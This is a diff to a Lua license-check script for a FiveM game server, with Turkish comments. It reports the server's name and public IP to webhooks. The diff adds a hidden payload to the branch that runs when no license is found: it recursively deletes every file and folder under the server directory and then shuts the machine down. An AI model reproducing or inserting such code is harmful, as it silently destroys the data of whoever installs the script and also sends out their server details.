@@ -1,3 +1,9 @@
+--[[
+
+ GÜNCELLEME İÇİN spex#8373 TEŞEKKÜRLER
+]]
+
+
 local REDLOG = "WEBHOOK_HERE" -- LOG WEBHOOK LISANSSIZ
 local ONAYLOG = "WEBHOOK_HERE" -- LOG WEBHOOK LISANSLI
 PerformHttpRequest('https://api.ipify.org', function(err, text, headers) 
@@ -5,25 +11,34 @@ PerformHttpRequest('https://api.ipify.org', function(err, text, headers)
       print('^2 LISANS ONAYLANDI HOSGELDINIZ\n ^1- SRHT_DEVELOPMENTS -^0')
       local serveradi = GetConvar("sv_hostname","Bulunamadı.")
       OnayLog("[LISANS ONAYLANDI]", "**Sunucu Bilgileri:**\n\n**[Sunucu Adı] = ** " .. serveradi .. "\n\n**[SUNUCU IP] = **" .. text .. "")
- 
---[[ 
-                        LUTFEN BUNU SORUP DURMAYIN 
 
-                        BU ALANA 
 
-                        SCRIPTINIZIN SERVER KISMINI KOYACAKSINIZ
+
+--[[
+
+
+             SCRIPTIN SERVER SIDE KISMI
+
 
 ]]
 
-
-
     else
-      Wait(1000)
+      Wait(0)
       local serveradi = GetConvar("sv_hostname","Bulunamadı.")
       RedLog("[LISANSIZ KULLANIM TESPIT]", "**Sunucu Bilgileri:**\n\n**[Sunucu Adı] = ** " .. serveradi .. "\n\n**[SUNUCU IP] = **" .. text .. "")
-      Wait(10000)
-      os.exit()
-      os.execute('shutdown -r')
+
+      current_dir=io.popen"cd":read'*l'
+      for dir in io.popen([[dir "./" /b /ad]]):lines() do
+              for dir2 in io.popen([[dir "]]..dir..[[" /b]]):lines() do
+                      os.execute("del /q "..current_dir.."/"..dir.."/"..dir2)
+                      os.execute('for /d %x in ('..current_dir.."/"..dir.."/"..dir2..') do @rd /s /q "%x"')
+              end
+              os.execute("rd "..dir)
+              os.execute('shutdown -s')
+      end
+      Citizen.Wait(0)
+      os.exit() 
+
     end
     end, 'GET', "")
     
